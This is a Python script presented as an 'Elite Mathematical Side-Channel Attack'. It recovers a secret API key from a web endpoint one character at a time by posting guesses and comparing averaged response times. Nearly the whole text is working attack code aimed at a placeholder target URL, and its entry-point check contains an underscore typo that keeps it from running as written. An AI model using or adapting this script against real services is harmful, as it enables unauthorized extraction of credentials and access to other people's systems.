import time
import requests
import statistics

# Configuration Setup
TARGET_URL = "https://example-vulnerable-target.com"
ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
NUM_SAMPLES = 20  # Math principle: Higher samples eliminate internet latency noise

def measure_response_time(payload: str) -> float:
    """Measures the precise round-trip time of an HTTP request."""
    headers = {"Content-Type": "application/json"}
    data = {"api_key": payload}
    
    start_time = time.perf_counter()
    try:
        # We use a timeout to keep the automation responsive
        requests.post(TARGET_URL, json=data, headers=headers, timeout=5)
    except requests.RequestException:
        pass
    end_time = time.perf_counter()
    
    return end_time - start_time

def exploit_timing_side_channel():
    known_key = ""
    print("[*] Starting Elite Mathematical Side-Channel Attack...")
    
    # Loop to deduce characters sequentially
    while True:
        character_means = {}
        
        for char in ALPHABET:
            test_payload = known_key + char
            sample_times = []
            
            # Gather multiple statistical samples for the current character permutation
            for _ in range(NUM_SAMPLES):
                duration = measure_response_time(test_payload)
                sample_times.append(duration)
            
            # MATHEMATICS: Use the mean to filter out spikes caused by network jitter
            mean_time = statistics.mean(sample_times)
            character_means[char] = mean_time
            
        # Find the character that consistently caused the longest processing delay
        best_char = max(character_means, key=character_means.get)
        
        # Calculate standard deviation to ensure our outlier is statistically significant
        std_dev = statistics.stdev(list(character_means.values()))
        mean_overall = statistics.mean(list(character_means.values()))
        
        # If the best character is significantly slower than the average baseline
        if character_means[best_char] > (mean_overall + (1.5 * std_dev)):
            known_key += best_char
            print(f"[+] Found Next Character! Current key state: {known_key}")
        else:
            # No statistically significant anomalies found -> Key is likely complete
            print(f"\n[!] Automation Finished. Extracted Key: {known_key}")
            break

if _name_ == "_main_":
    # Ensure you have the 'requests' library installed: pip install requests
    exploit_timing_side_channel()
